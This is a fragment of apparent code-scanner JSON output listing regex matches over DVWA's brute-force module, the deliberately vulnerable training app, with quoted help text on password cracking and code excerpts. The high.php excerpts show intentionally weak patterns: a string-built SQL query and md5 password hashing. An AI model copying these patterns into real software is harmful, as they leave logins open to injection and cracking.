          "Dependency.SourceInclude"
        ],
        "sample": "include",
        "excerpt": "\t\t&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.\n\t\t\tA common approach is to repeatedly try guesses for the password.&lt;/p&gt;\n\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n\n\t\t&lt;p&gt;Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary\n\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n",
        "startLocationLine": 12,
        "startLocationColumn": 70,
        "endLocationLine": 12,
        "endLocationColumn": 151
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "&lt;div class=&quot;body_padded&quot;&gt;\n\t&lt;h1&gt;Help - Brute Force (Login)&lt;/h1&gt;\n\n\t&lt;div id=&quot;code&quot;&gt;\n\t&lt;table width=&#39;100%&#39; bgcolor=&#39;white&#39; style=&quot;border:2px #C0C0C0 solid&quot;&gt;\n\t&lt;tr&gt;\n\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n",
        "startLocationLine": 2,
        "startLocationColumn": 26,
        "endLocationLine": 2,
        "endLocationColumn": 31
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;The developer has completely missed out &lt;u&gt;any protections methods&lt;/u&gt;, allowing for anyone to try as many times as they wish, to login to any user without any repercussions.&lt;/p&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;This stage adds a sleep on the failed login screen. This mean when you login incorrectly, there will be an extra two second wait before the page is visible.&lt;/p&gt;\n",
        "startLocationLine": 31,
        "startLocationColumn": 136,
        "endLocationLine": 31,
        "endLocationColumn": 141
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;This stage adds a sleep on the failed login screen. This mean when you login incorrectly, there will be an extra two second wait before the page is visible.&lt;/p&gt;\n\n\t\t&lt;p&gt;This will only slow down the amount of requests which can be processed a minute, making it longer to brute force.&lt;/p&gt;\n\n\t\t&lt;br /&gt;\n\n",
        "startLocationLine": 36,
        "startLocationColumn": 44,
        "endLocationLine": 36,
        "endLocationColumn": 49
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;This stage adds a sleep on the failed login screen. This mean when you login incorrectly, there will be an extra two second wait before the page is visible.&lt;/p&gt;\n\n\t\t&lt;p&gt;This will only slow down the amount of requests which can be processed a minute, making it longer to brute force.&lt;/p&gt;\n\n\t\t&lt;br /&gt;\n\n",
        "startLocationLine": 36,
        "startLocationColumn": 77,
        "endLocationLine": 36,
        "endLocationColumn": 82
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\n\t\t&lt;h3&gt;High Level&lt;/h3&gt;\n\t\t&lt;p&gt;There has been an &quot;anti Cross-Site Request Forgery (CSRF) token&quot; used. There is a old myth that this protection will stop brute force attacks. This is not the case.\n\t\t\tThis level also extends on the medium level, by waiting when there is a failed login but this time it is a random amount of time between two and four seconds.\n\t\t\tThe idea of this is to try and confuse any timing predictions.&lt;/p&gt;\n\n\t\t&lt;p&gt;Using a &lt;?php echo dvwaExternalLinkUrlGet( &#39;https://en.wikipedia.org/wiki/CAPTCHA&#39;, &#39;CAPTCHA&#39; ); ?&gt; form could have a similar effect as a CSRF token.&lt;/p&gt;\n\n\t\t&lt;br /&gt;\n",
        "startLocationLine": 44,
        "startLocationColumn": 83,
        "endLocationLine": 44,
        "endLocationColumn": 88
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t&lt;p&gt;Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a &quot;lock out&quot; feature, where if there are five bad logins within\n\t\t\tthe last 15 minutes, the locked out user cannot log in.&lt;/p&gt;\n\n\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n\t\t&lt;p&gt;This can cause a &quot;Denial of Service&quot; (DoS), by having someone continually trying to login to someone&#39;s account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n",
        "startLocationLine": 55,
        "startLocationColumn": 38,
        "endLocationLine": 55,
        "endLocationColumn": 43
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n\t\t&lt;p&gt;This can cause a &quot;Denial of Service&quot; (DoS), by having someone continually trying to login to someone&#39;s account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n\t&lt;/tr&gt;\n\t&lt;/table&gt;\n\n",
        "startLocationLine": 58,
        "startLocationColumn": 90,
        "endLocationLine": 58,
        "endLocationColumn": 95
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI036700",
        "ruleName": "OS: Multiprocessing / Multithreading",
        "ruleDescription": "OS: Multiprocessing / Multithreading",
        "pattern": "\\b(mutex|semaphore|thread|lock|fork)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.Multiprocessing"
        ],
        "sample": "lock",
        "excerpt": "\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n\t\t&lt;p&gt;Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a &quot;lock out&quot; feature, where if there are five bad logins within\n\t\t\tthe last 15 minutes, the locked out user cannot log in.&lt;/p&gt;\n\n\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n",
        "startLocationLine": 52,
        "startLocationColumn": 116,
        "endLocationLine": 52,
        "endLocationColumn": 120
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "insecure",
        "excerpt": "\t\t&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.\n\t\t\tA common approach is to repeatedly try guesses for the password.&lt;/p&gt;\n\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n\n\t\t&lt;p&gt;Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary\n\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n",
        "startLocationLine": 12,
        "startLocationColumn": 53,
        "endLocationLine": 12,
        "endLocationColumn": 61
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "&lt;?php\n\nif( isset( $_GET[ &#39;Login&#39; ] ) ) {\n\t// Check Anti-CSRF token\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );\n\n\t// Sanitise username input\n\t$user = $_GET[ &#39;username&#39; ];\n",
        "startLocationLine": 3,
        "startLocationColumn": 20,
        "endLocationLine": 3,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n",
        "startLocationLine": 25,
        "startLocationColumn": 4,
        "endLocationLine": 25,
        "endLocationColumn": 10
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n",
        "startLocationLine": 25,
        "startLocationColumn": 19,
        "endLocationLine": 25,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n\telse {\n\t\t// Login failed\n\t\tsleep( rand( 0, 3 ) );\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n",
        "startLocationLine": 29,
        "startLocationColumn": 26,
        "endLocationLine": 29,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;",
        "excerpt": "\t$pass = md5( $pass );\n\n\t// Check database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n",
        "startLocationLine": 19,
        "startLocationColumn": 12,
        "endLocationLine": 19,
        "endLocationColumn": 82
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t// Check database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 16,
        "startLocationColumn": 10,
        "endLocationLine": 16,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "&lt;?php\n\nif( isset( $_POST[ &#39;Login&#39; ] ) &amp;&amp; isset ($_POST[&#39;username&#39;]) &amp;&amp; isset ($_POST[&#39;password&#39;]) ) {\n\t// Check Anti-CSRF token\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );\n\n\t// Sanitise username input\n\t$user = $_POST[ &#39;username&#39; ];\n",
        "startLocationLine": 3,
        "startLocationColumn": 21,
        "endLocationLine": 3,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t// Had the account been locked out since last login?\n\t\tif( $failed_login &gt;= $total_failed_login ) {\n\t\t\t$html .= &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;\n\t\t\t$html .= &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;;\n\t\t}\n\n\t\t// Reset bad login count\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n",
        "startLocationLine": 73,
        "startLocationColumn": 27,
        "endLocationLine": 73,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t// Had the account been locked out since last login?\n\t\tif( $failed_login &gt;= $total_failed_login ) {\n\t\t\t$html .= &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;\n\t\t\t$html .= &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;;\n\t\t}\n\n\t\t// Reset bad login count\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n",
        "startLocationLine": 73,
        "startLocationColumn": 79,
        "endLocationLine": 73,
        "endLocationColumn": 84
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\t// If its a valid login...\n\tif( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {\n\t\t// Get users details\n\t\t$avatar       = $row[ &#39;avatar&#39; ];\n\t\t$failed_login = $row[ &#39;failed_login&#39; ];\n\t\t$last_login   = $row[ &#39;last_login&#39; ];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;;\n",
        "startLocationLine": 62,
        "startLocationColumn": 4,
        "endLocationLine": 62,
        "endLocationColumn": 10
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\t// If its a valid login...\n\tif( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {\n\t\t// Get users details\n\t\t$avatar       = $row[ &#39;avatar&#39; ];\n\t\t$failed_login = $row[ &#39;failed_login&#39; ];\n\t\t$last_login   = $row[ &#39;last_login&#39; ];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;;\n",
        "startLocationLine": 62,
        "startLocationColumn": 26,
        "endLocationLine": 62,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\n\t\t// Had the account been locked out since last login?\n\t\tif( $failed_login &gt;= $total_failed_login ) {\n\t\t\t$html .= &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;\n\t\t\t$html .= &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;;\n",
        "startLocationLine": 68,
        "startLocationColumn": 26,
        "endLocationLine": 68,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; );",
        "excerpt": "\t$account_locked     = false;\n\n\t// Check the database (Check user information)\n\t$data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\t$row = $data-&gt;fetch();\n\n\t// Check to see if the user has been locked out.\n",
        "startLocationLine": 24,
        "startLocationColumn": 24,
        "endLocationLine": 24,
        "endLocationColumn": 102
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );",
        "excerpt": "\t}\n\n\t// Check the database (if username matches the password)\n\t$data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\t$row = $data-&gt;fetch();\n\n",
        "startLocationLine": 53,
        "startLocationColumn": 24,
        "endLocationLine": 53,
        "endLocationColumn": 106
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; );",
        "excerpt": "\t\t}\n\n\t\t// Reset bad login count\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\t} else {\n\t\t// Login failed\n\t\tsleep( rand( 2, 4 ) );\n",
        "startLocationLine": 77,
        "startLocationColumn": 25,
        "endLocationLine": 77,
        "endLocationColumn": 96
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
